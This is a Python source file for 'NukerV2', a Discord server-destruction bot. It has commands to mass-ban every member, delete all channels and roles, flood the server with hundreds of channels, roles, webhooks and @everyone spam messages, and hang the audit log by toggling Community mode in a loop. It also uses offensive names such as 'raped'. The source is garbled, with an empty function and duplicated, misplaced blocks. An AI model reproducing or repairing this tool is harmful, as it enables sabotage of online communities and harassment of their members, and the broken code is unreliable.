import requests
from colorama import init, Fore, Style, Back
import discord
from discord.ext import commands
import threading
import colorama
import random
import json
import time
import requests
import os
import sys
from discord import Webhook
import asyncio
from colour import Color
from discord import Color as c
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System



os.system('mode con: cols=105 lines=25')
os.system('cls & title NukerV2 by Lone')
init()

Prefix = "!"

client = commands.Bot(command_prefix=Prefix, intents=discord.Intents.all())


TOKEN = input("[!] Token: ")
os.system('cls & title NukerV2')
print(f'''




                                             
                              
                               
                                      ┏━┓╋┏┓╋╋┏┓     ┏┓╋╋┏┳━━━┓
                                      ┃┃┗┓┃┃╋╋┃┃     ┃┗┓┏┛┃┏━┓┃
                                      ┃┏┓┗┛┣┓┏┫┃┏┳━━┳┻┓┃┃┏┻┛┏┛┃
                                      ┃┃┗┓┃┃┃┃┃┗┛┫┃━┫┏┫┗┛┃┏━┛┏┛
                                      ┃┃╋┃┃┃┗┛┃┏┓┫┃━┫┃┗┓┏┛┃┃┗━┓
                                      ┗┛╋┗━┻━━┻┛┗┻━━┻┛╋┗┛╋┗━━━┛
                                      
                                                             {Fore.MAGENTA}Made by: {Fore.WHITE}Lone#6456
                                                             Prefix: {Fore.RED}!
                      
               {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}!massban                               
               {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!deleteAllChannels
               {Fore.BLUE}[{Fore.WHITE}>{Fore.BLUE}] {Fore.WHITE}!deleteAllRoles
               {Fore.BLACK}[{Fore.WHITE}>{Fore.BLACK}] {Fore.WHITE}!MassChannels
               {Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {Fore.WHITE}!MassRoles
               {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}!MassWebhooks
               {Fore.WHITE}[{Fore.WHITE}>{Fore.WHITE}] {Fore.RED}!MassPing
               {Fore.BLUE}[{Fore.WHITE}>{Fore.BLUE}] {Fore.MAGENTA}!DestroyServer
               {Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {Fore.WHITE}!bypass!
                       
                                             

''')

headers = {
    "Authorization":
    f"Bot {TOKEN}"
}
def logo():
    os.system('cls & title NukerV2')
    print(f'''




                                             
                              
                               
                                      ┏━┓╋┏┓╋╋┏┓     ┏┓╋╋┏┳━━━┓
                                      ┃┃┗┓┃┃╋╋┃┃     ┃┗┓┏┛┃┏━┓┃
                                      ┃┏┓┗┛┣┓┏┫┃┏┳━━┳┻┓┃┃┏┻┛┏┛┃
                                      ┃┃┗┓┃┃┃┃┃┗┛┫┃━┫┏┫┗┛┃┏━┛┏┛
                                      ┃┃╋┃┃┃┗┛┃┏┓┫┃━┫┃┗┓┏┛┃┃┗━┓
                                      ┗┛╋┗━┻━━┻┛┗┻━━┻┛╋┗┛╋┗━━━┛
                                      
                                                             {Fore.MAGENTA}Made by: {Fore.WHITE}Lone#6456
                                                             Prefix: {Fore.RED}!
                      
               {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}!massban                               
               {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!deleteAllChannels
               {Fore.BLUE}[{Fore.WHITE}>{Fore.BLUE}] {Fore.WHITE}!deleteAllRoles
               {Fore.BLACK}[{Fore.WHITE}>{Fore.BLACK}] {Fore.WHITE}!MassChannels
               {Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {Fore.WHITE}!MassRoles
               {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}!MassWebhooks
               {Fore.WHITE}[{Fore.WHITE}>{Fore.WHITE}] {Fore.RED}!MassPing
               {Fore.BLUE}[{Fore.WHITE}>{Fore.BLUE}] {Fore.MAGENTA}!DestroyServer
               {Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {Fore.WHITE}!bypass!
                       
                                             

    ''')

client.remove_command('help')

#credits to takaso
Guild_ID = input("Guild Id> ")

a = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None
}

a2 = {
    "features": ["COMMUNITY"],
    "preferred_locale": "en-US",
    "rules_channel_id": "1",
    "public_updates_channel_id": "1"
}

def CommunityFlood():
    global Guild_ID
    while True:
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{Guild_ID}", headers=headers, json=a2)
            s = [200, 201, 204]
            if r.status_code in s:
                print("Created Community")
            elif r.status_code == 429:
                b = r.json()
                print(f"Rate limited, retrying in {b['retry_after']} seconds")
                time.sleep(b['retry_after'])
        except:
            pass
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{Guild_ID}", headers=headers, json=a)
            s = [200, 201, 204]
            if r.status_code in s:
                print("Disabled Community")
            elif r.status_code == 429:
                b= r.json()
                print(f"Rate limited, retrying in {b['retry_after']} seconds")
                time.sleep(b['retry_after'])
        except:
            pass        

def Audit_Hang():
    for i in range(8):
        t = threading.Thread(target=CommunityFlood)
        t.start()
        
        
@client.command(aliases=['bypass'])
async def ma(ctx):
    Audit_Hang()
    time.sleep(2)
    logo()
   
@client.command(aliases=['mb'])
async def massban(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
            headers=headers
        )

    for i in range(5):
        for member in list(ctx.guild.members):
            threading.Thread(
                target=mass_ban,
                args=(member.id,)
            ).start()
    time.sleep(2)
    logo()
            
            
@client.command(aliases=['dc', 'dac'])
async def deleteAllChannels(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id
    channelel = ctx.guild.channels
    
  
    def channel_delete(i):
        sessions = requests.Session()
        r = sessions.delete(
            f"https://discord.com/api/v9/channels/{i}",
            headers=headers
        )
        s = [200, 201, 204]
        if r.status_code in s:
            t = r.json()
            print(f"{Fore.CYAN}Deleted {Fore.RED}{i}")
        elif r.status_code == 429:
            b = r.json()
            print(f"{Fore.RED}Rate Limited, {Fore.GREEN}retrying in {b['retry_after']} seconds")
            time.sleep(b['retry_after'])            

    for i in range(10):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=channel_delete,
                args=(channel.id,)
            ).start()
            
        

@client.command(aliases=['dr', 'dar'])
async def deleteAllRoles(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id
    channelel = ctx.guild.channels

    def role_delete(i):
        sessions = requests.Session()
        sessions.delete(
            f"https://discord.com/api/v9/guilds/{servr}/roles/{i}",
            headers=headers
        )

    for i in range(900):
        for role in list(ctx.guild.roles):
            threading.Thread(
                target=role_delete,
                args=(role.id,)
            ).start()
            
channel_names = ("raped", "nuked")
@client.command(aliases=['mc', 'mschan'])
async def MassChannels(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_channels(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
        
    for i in range(450):
        threading.Thread(
            target=create_channels,
            args=(random.choice(channel_names), )
        ).start()


role_names = ("RAPED", "NUKED", "DESTROYED")
@client.command(aliases=['mr', 'msroles'])
async def MassRoles(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_channels(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
        
    for i in range(100):
        threading.Thread(
            target=create_channels,
            args=(random.choice(role_names), )
        ).start()
        
web_names = ("RAPED", "NUKED", "DESTROYED")
@client.command(aliases=['mw', 'msweb'])
async def MassWebhooks(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        if type(channel) == discord.TextChannel:
            await channel.create_webhook(name=random.choice(web_names))
            
random_mes = ("@everyone NUKED", "@everyone DO BETTER")            
@client.command()
async def MassPing(ctx):
    sessions = requests.Session()
    guild = ctx.guild
    
    def mass_ping(i):        
    
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_roles(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
        
    for i in range(10):
        threading.Thread(
            target=create_roles,
            args=(random.choice(role_names), )
        ).start()
    
            
        
    sessions = requests.Session()
    guild = ctx.guild
    
    def mass_ping(i):
        js = {
            "content": random.choice(random_mes),
            "tts": False
        
        }
        
        sessions.post(f"https://discord.com/api/v9/channels/{i}/messages", headers=headers, json=js)
        
    for i in range (5):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=mass_ping,
                args=(channel.id, )
            )
    return
    

    

try:
    client.run(TOKEN)
except:
    os.system('cls && title error NukerV1')
    print(Fore.RED + "[!] Invalid Token")
        js = {
            "content": random.choice(random_mes),
            "tts": False
        
        }
        
        sessions.post(f"https://discord.com/api/v9/channels/{i}/messages", headers=headers, json=js)
        
    for i in range (5):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=mass_ping,
                args=(channel.id, )
            
            ).start()
nuke_channel_names = ("nuked", "rap")
webhook_names = ("NUKED", "RAPED")
@client.event
async def on_guild_channel_create(channel):
    while True:
        try:
            if channel.name == random.choice(nuke_channel_names):
                for i in range(3):
                    webhook = await channel.create_webhook(name=random.choice(webhook_names))
                for i in range(500):
                    webhooks = discord.utils.get(await channel.webhooks())
                    await webhooks.channel.send(random.choice(random_mes))
        except Exception:
           pass
  
@client.command(aliases=['DestroyServer', 'Nuke', 'rape', 'destroy', 'decimate'])
async def nuke(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id
    channelel = ctx.guild.channels
    
  
    def channel_delete(i):
        sessions = requests.Session()
        try:
            sessions.delete(
                f"https://discord.com/api/v9/channels/{i}",
                headers=headers
            )
        except:
            print(Fore. RED + "channel deletion couldn't happen continuing nuking")

    for i in range(7):
        for channel in list(ctx.guild.channels):
            try:
                threading.Thread(
                    target=channel_delete,
                    args=(channel.id,)
                ).start()
                
            except:
                print(Fore.RED + "Couldn't delete a channel continuing nuking....")
                pass
   
    servr = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
            headers=headers
        )

    for i in range(5):
        for member in list(ctx.guild.members):
            threading.Thread(
                target=mass_ban,
                args=(member.id,)
            ).start()
            
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_channels(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
        
    for i in range(500):
        threading.Thread(
            target=create_channels,
            args=(random.choice(channel_names), )
        ).start()
            
    servr = ctx.guild.id
    channelel = ctx.guild.channels

    def role_delete(i):
        sessions = requests.Session()
        sessions.delete(
            f"https://discord.com/api/v9/guilds/{servr}/roles/{i}",
            headers=headers
        )

    for i in range(7):
        for role in list(ctx.guild.roles):
            threading.Thread(
                target=role_delete,
                args=(role.id,)
            ).start()
        
    
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_roles(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
        
    for i in range(10):
        threading.Thread(
            target=create_roles,
            args=(random.choice(role_names), )
        ).start()
    
            
        
    sessions = requests.Session()
    guild = ctx.guild
    
    def mass_ping(i):
        js = {
            "content": random.choice(random_mes),
            "tts": False
        
        }
        
        sessions.post(f"https://discord.com/api/v9/channels/{i}/messages", headers=headers, json=js)
        
    for i in range (5):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=mass_ping,
                args=(channel.id, )
            )
    return
    

    

try:
    client.run(TOKEN)
except:
    os.system('cls && title error NukerV1')
    print(Fore.RED + "[!] Invalid Token")
